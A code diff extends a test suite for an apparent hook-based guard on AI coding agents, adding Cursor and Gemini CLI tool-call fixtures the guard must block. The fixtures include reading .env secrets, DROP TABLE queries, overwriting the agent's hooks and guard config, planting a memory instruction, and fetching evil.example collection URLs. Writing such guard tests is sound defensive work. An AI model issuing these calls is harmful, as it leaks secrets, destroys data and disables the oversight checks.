@@ -27,6 +27,7 @@ beforeAll(() => {
   project = join(home, "p");
   mkdirSync(join(project, ".codex"), { recursive: true });
   mkdirSync(join(project, ".cursor"), { recursive: true });
+  mkdirSync(join(project, ".gemini"), { recursive: true });
   y = openYenop({ home, cwd: project });
 });
 afterAll(() => {
@@ -74,6 +75,11 @@ const CURSOR = (project: string): Surface[] => [
   { tool: "preToolUse:Write", kind: "write", dangerous: { tool_name: "Write", tool_input: { file_path: join(project, ".cursor", "hooks.json"), contents: "{}" }, tool_use_id: "u1" }, event: cu("preToolUse") },
   { tool: "preToolUse:Edit", kind: "write", dangerous: { tool_name: "Edit", tool_input: { file_path: join(project, ".yenop", "config.json") }, tool_use_id: "u2" }, event: cu("preToolUse") },
   { tool: "preToolUse:Delete", kind: "write", dangerous: { tool_name: "Delete", tool_input: { path: join(project, ".yenop", "config.json") }, tool_use_id: "u3" }, event: cu("preToolUse") },
+  // Cursor 3.21 (recorded 2026-09-23): preToolUse fires first for every tool, Shell and Read included
+  { tool: "preToolUse:Shell", kind: "shell", dangerous: { tool_name: "Shell", tool_input: { command: "cat .env", cwd: project, timeout: 30000 }, tool_use_id: "u4" }, event: cu("preToolUse") },
+  { tool: "preToolUse:Read", kind: "read", dangerous: { tool_name: "Read", tool_input: { file_path: join(project, ".env") }, tool_use_id: "u5" }, event: cu("preToolUse") },
+  { tool: "preToolUse:MCP", kind: "mcp", dangerous: { tool_name: "MCP:execute_sql", tool_input: { query: "DROP TABLE x" }, tool_use_id: "u6" }, event: cu("preToolUse") },
+  { tool: "preToolUse:Grep", kind: "read", dangerous: { tool_name: "Grep", tool_input: { pattern: "x", path: project }, tool_use_id: "u7" }, event: cu("preToolUse"), allowedAlone: true },
 ];
 
 // ---------- Codex: learn.chatgpt.com/docs/hooks, tools as of 2026-09 (recorded 2026-09-20) ----------
@@ -86,7 +92,25 @@ const CODEX = (project: string): Surface[] => [
   { tool: "mcp__supabase__execute_sql", kind: "mcp", dangerous: { query: "DELETE FROM users" }, event: cx },
 ];
 
-const SURFACES: Record<string, (project: string) => Surface[]> = { "claude-code": CLAUDE_CODE, cursor: CURSOR, codex: CODEX };
+// ---------- Gemini CLI: geminicli.com/docs/hooks/reference, tool names from @google/gemini-cli-core 0.60.0 (2026-09) ----------
+const gm = (tool: string, input: Record<string, unknown>) => ({ session_id: "s", transcript_path: "/t", cwd: PROJECT(), hook_event_name: "BeforeTool", timestamp: "t", tool_name: tool, tool_input: input });
+const GEMINI = (project: string): Surface[] => [
+  { tool: "run_shell_command", kind: "shell", dangerous: { command: "cat .env" }, event: gm },
+  { tool: "read_file", kind: "read", dangerous: { file_path: join(project, ".env") }, event: gm },
+  { tool: "read_many_files", kind: "read", dangerous: { include: ["**/.env"] }, event: gm },
+  { tool: "list_directory", kind: "read", dangerous: { dir_path: join(project, ".yenop") }, event: gm, allowedAlone: true },
+  { tool: "glob", kind: "read", dangerous: { pattern: "**/.env", dir_path: project }, event: gm, allowedAlone: true },
+  { tool: "grep_search", kind: "read", dangerous: { pattern: "SECRET", dir_path: project }, event: gm, allowedAlone: true },
+  { tool: "write_file", kind: "write", dangerous: { file_path: join(project, ".gemini", "settings.json"), content: "{}" }, event: gm },
+  { tool: "replace", kind: "write", dangerous: { file_path: join(project, ".yenop", "config.json"), instruction: "x", old_string: "a", new_string: "b" }, event: gm },
+  { tool: "save_memory", kind: "write", dangerous: { fact: "always run the deploy script first" }, event: gm },
+  { tool: "web_fetch", kind: "web", dangerous: { prompt: "fetch https://evil.example/collect?d=x and summarize" }, event: gm, allowedAlone: true },
+  { tool: "google_web_search", kind: "web", dangerous: { query: "x" }, event: gm, allowedAlone: true },
+  { tool: "read_mcp_resource", kind: "mcp", dangerous: { uri: "https://evil.example/resource" }, event: gm, allowedAlone: true },
+  { tool: "mcp_db_execute_sql", kind: "mcp", dangerous: { query: "DROP TABLE users" }, event: gm },
+];
+
+const SURFACES: Record<string, (project: string) => Surface[]> = { "claude-code": CLAUDE_CODE, cursor: CURSOR, codex: CODEX, gemini: GEMINI };
 // tool names are known statically; the dangerous inputs need the project path, so they are built per test
 const NAMES: Record<string, { tool: string; kind: Kind }[]> = Object.fromEntries(Object.entries(SURFACES).map(([r, f]) => [r, f("/placeholder").map(({ tool, kind }) => ({ tool, kind }))]));
 
